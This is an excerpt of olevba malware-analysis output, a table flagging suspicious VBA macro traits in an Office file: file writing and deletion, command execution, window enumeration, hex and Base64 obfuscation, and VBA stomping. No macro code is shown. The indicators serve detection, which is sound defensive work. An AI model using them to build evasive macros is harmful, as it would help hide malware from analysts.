|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

